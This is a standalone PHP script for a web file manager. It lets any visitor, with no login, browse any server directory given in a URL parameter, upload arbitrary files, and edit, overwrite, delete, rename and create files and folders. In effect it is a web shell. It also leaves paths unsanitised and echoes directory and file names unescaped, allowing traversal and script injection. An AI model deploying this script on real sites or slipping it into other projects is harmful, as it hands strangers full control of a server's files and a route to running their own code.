<?php
session_start();

// Get the target directory
$directory = $_GET['dir'] ?? __DIR__;

// Display directory contents
function showDirectoryContents($directory) {
    $entries = array_diff(scandir($directory), ['.', '..']);
    echo "<h3>Directory: '$directory'</h3><ul>";
    foreach ($entries as $entry) {
        $path = realpath("$directory/$entry");
        $isDir = is_dir($path);
        $cssStyle = getStyle($path);

        echo "<li style='$cssStyle'>";
        if ($isDir) {
            echo "<a href='?dir=$path'>$entry</a>";
        } else {
            echo "$entry - 
                <a href='?dir=$directory&action=edit&file=$entry'>Edit</a> | 
                <a href='?dir=$directory&action=delete&file=$entry'>Delete</a> | 
                <a href='?dir=$directory&action=rename&file=$entry'>Rename</a>";
        }
        echo "</li>";
    }
    echo "</ul>";
}

// Determine CSS style for files and directories
function getStyle($filePath) {
    if (is_readable($filePath) && is_writable($filePath)) {
        return "color: green;";
    } elseif (!is_writable($filePath)) {
        return "color: red;";
    }
    return "color: gray;";
}

// Handle file uploads
function uploadFile($directory) {
    if (!empty($_FILES['fileToUpload'])) {
        $destination = $directory . DIRECTORY_SEPARATOR . basename($_FILES['fileToUpload']['name']);
        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $destination)) {
            echo "<p>File uploaded successfully!</p>";
        } else {
            echo "<p>Failed to upload file.</p>";
        }
    }
}

// Create a new folder
function createFolder($directory) {
    if (!empty($_POST['folderName'])) {
        $folderPath = $directory . DIRECTORY_SEPARATOR . $_POST['folderName'];
        if (!file_exists($folderPath)) {
            mkdir($folderPath);
            echo "<p>Folder created successfully!</p>";
        } else {
            echo "<p>Folder already exists.</p>";
        }
    }
}

// Create a new file
function createFile($directory) {
    if (!empty($_POST['fileName'])) {
        $filePath = $directory . DIRECTORY_SEPARATOR . $_POST['fileName'];
        if (!file_exists($filePath)) {
            file_put_contents($filePath, '');
            echo "<p>File created successfully!</p>";
        } else {
            echo "<p>File already exists.</p>";
        }
    }
}

// Edit an existing file
function editFile($filePath) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($filePath, $_POST['content']);
        echo "<p>File saved successfully!</p>";
    }

    $content = file_exists($filePath) ? htmlspecialchars(file_get_contents($filePath)) : '';
    echo "<form method='POST'>";
    echo "<textarea name='content' style='width:100%; height:300px;'>$content</textarea><br>";
    echo "<button type='submit'>Save</button>";
    echo "</form>";
}

// Delete a file
function deleteFile($filePath) {
    if (file_exists($filePath)) {
        unlink($filePath);
        echo "<p>File deleted successfully!</p>";
    }
}

// Rename a file
function renameFile($filePath) {
    if (!empty($_POST['newName'])) {
        $newPath = dirname($filePath) . DIRECTORY_SEPARATOR . $_POST['newName'];
        rename($filePath, $newPath);
        echo "<p>File renamed successfully!</p>";
    } else {
        echo "<form method='POST'>";
        echo "<input type='text' name='newName' placeholder='New Name'>";
        echo "<button type='submit'>Rename</button>";
        echo "</form>";
    }
}

// Handle actions
if (!empty($_GET['action']) && !empty($_GET['file'])) {
    $filePath = $directory . DIRECTORY_SEPARATOR . $_GET['file'];
    switch ($_GET['action']) {
        case 'edit':
            editFile($filePath);
            break;
        case 'delete':
            deleteFile($filePath);
            break;
        case 'rename':
            renameFile($filePath);
            break;
    }
}


// Handle form submissions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileToUpload'])) {
        uploadFile($directory);
    } elseif (!empty($_POST['folderName'])) {
        createFolder($directory);
    } elseif (!empty($_POST['fileName'])) {
        createFile($directory);
    }
}

echo "<p>Current Directory: <strong>$directory</strong></p>";
echo "<a href='?dir=" . dirname($directory) . "'>Go Up</a>";

showDirectoryContents($directory);

// File upload form
echo "<h3>Upload File</h3>";
echo "<form method='POST' enctype='multipart/form-data'>";
echo "<input type='file' name='fileToUpload'>";
echo "<button type='submit'>Upload</button>";
echo "</form>";

// Create folder form
echo "<h3>Create Folder</h3>";
echo "<form method='POST'>";
echo "<input type='text' name='folderName' placeholder='Folder Name'>";
echo "<button type='submit'>Create</button>";
echo "</form>";

// Create file form
echo "<h3>Create File</h3>";
echo "<form method='POST'>";
echo "<input type='text' name='fileName' placeholder='File Name'>";
echo "<button type='submit'>Create</button>";
echo "</form>";
?>
